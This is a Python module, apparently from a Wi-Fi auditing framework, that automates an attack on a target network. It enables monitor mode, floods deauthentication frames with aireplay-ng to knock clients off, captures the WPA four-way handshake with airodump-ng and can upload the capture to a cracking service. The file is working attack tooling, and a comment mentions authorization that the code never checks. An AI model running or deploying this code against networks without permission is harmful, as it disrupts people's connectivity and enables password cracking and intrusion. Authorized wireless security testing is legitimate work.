"""
Wi-Fi active module.

Performs active operations on Wi-Fi networks:
- Deauthentication attacks to capture handshakes.
- Association attempts.
- Optimized for low-resource devices; uses subprocess efficiently.
- Requires monitor mode interface (e.g., wlan0mon).
"""

import logging
import subprocess
import time
from pathlib import Path
from typing import Dict, Any, Optional, List

import yaml

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).resolve().parent.parent
CONFIG_PATH = BASE_DIR / "config" / "config.yaml"


def _load_config() -> Dict[str, Any]:
    if not CONFIG_PATH.is_file():
        return {}
    return yaml.safe_load(CONFIG_PATH.read_text(encoding="utf-8")) or {}


def _run_command(cmd: List[str], timeout: int = 60) -> bool:
    """Run a command, return True if successful."""
    try:
        subprocess.run(cmd, timeout=timeout, check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError as e:
        logger.error("Command failed: %s, stderr: %s", cmd, e.stderr)
        return False
    except subprocess.TimeoutExpired:
        logger.error("Command timed out: %s", cmd)
        return False


def enable_monitor_mode(interface: str = "wlan0") -> Optional[str]:
    """Enable monitor mode on interface."""
    logger.info("Enabling monitor mode on %s", interface)
    mon_interface = f"{interface}mon"
    cmds = [
        ["sudo", "airmon-ng", "check", "kill"],
        ["sudo", "airmon-ng", "start", interface],
    ]
    for cmd in cmds:
        if not _run_command(cmd):
            return None
    return mon_interface


def disable_monitor_mode(mon_interface: str) -> None:
    """Disable monitor mode."""
    logger.info("Disabling monitor mode on %s", mon_interface)
    cmd = ["sudo", "airmon-ng", "stop", mon_interface]
    _run_command(cmd)
    cmd = ["sudo", "service", "NetworkManager", "restart"]
    _run_command(cmd)


def deauth_attack(mon_interface: str, bssid: str, client: Optional[str] = None, count: int = 5) -> None:
    """Perform deauth attack."""
    logger.info("Starting deauth attack on BSSID %s", bssid)
    cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd.extend(["-c", client])
    cmd.append(mon_interface)
    _run_command(cmd)


def capture_handshake(mon_interface: str, bssid: str, channel: int, duration: int = 60, job_id: int = None) -> None:
    """Capture handshake using airodump-ng."""
    logger.info("Capturing handshake for BSSID %s on channel %d for job %s", bssid, channel, job_id)
    suffix = f"_job_{job_id}" if job_id else ""
    cmd = [
        "sudo", "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", f"capture_{bssid.replace(':', '')}{suffix}",
        "--output-format", "cap",
        mon_interface
    ]
    # Run in background for duration
    proc = subprocess.Popen(cmd)
    time.sleep(duration)
    proc.terminate()
    proc.wait()


def run(job) -> None:
    """Run Wi-Fi active operations for the given job."""
    profile = job.profile or "default"
    logger.info("Starting Wi-Fi active ops for job %s with profile %s", job.id, profile)

    config = _load_config()
    interface = config.get("network", {}).get("wifi_interface_managed", "wlan0")
    target_bssid = job.params.get("target_bssid") if job.params else None
    target_channel = job.params.get("target_channel", 1)

    if not target_bssid:
        logger.error("No target_bssid provided for job %s", job.id)
        return

    mon_interface = enable_monitor_mode(interface)
    if not mon_interface:
        logger.error("Failed to enable monitor mode for job %s", job.id)
        return

    try:
        # Phase 3: Active External Audit
        
        # 1. Deauth Attack (if authorized/configured)
        # Using aireplay-ng to disconnect clients and force re-association (handshake capture)
        deauth_attack(mon_interface, target_bssid, count=10)
        
        # 2. Handshake Capture (EAPOL)
        # Using airodump-ng to capture the 4-way handshake
        capture_handshake(mon_interface, target_bssid, target_channel, duration=30, job_id=job.id)
        
        # 3. PMKID Capture (Optional/Advanced)
        # Could use hcxdumptool here if available, but sticking to airodump for now as base tool
        
        # 4. Check for captured handshake
        suffix = f"_job_{job.id}"
        cap_file = Path(f"capture_{target_bssid.replace(':', '')}{suffix}-01.cap")
        
        if cap_file.exists():
            # Move to data/captures
            captures_dir = BASE_DIR / "data" / "captures"
            captures_dir.mkdir(parents=True, exist_ok=True)
            new_path = captures_dir / cap_file.name
            cap_file.rename(new_path)
            logger.info("Handshake capture saved to %s", new_path)
            
            # Phase 5: Cracking / Post-Exploitation (Integration)
            # Automatically upload to WPA-Sec if configured
            if config.get("hash_services", {}).get("wpa_sec", {}).get("enabled", False):
                from modules.audits.hash_lookup import upload_to_wpasec
                upload_to_wpasec(new_path)
        
        logger.info("Wi-Fi active ops completed for job %s", job.id)
    except Exception as e:
        logger.error("Error in Wi-Fi active ops for job %s: %s", job.id, e)
    finally:
        disable_monitor_mode(mon_interface)
REQUIRED_PROFILE = "wifi_audit"
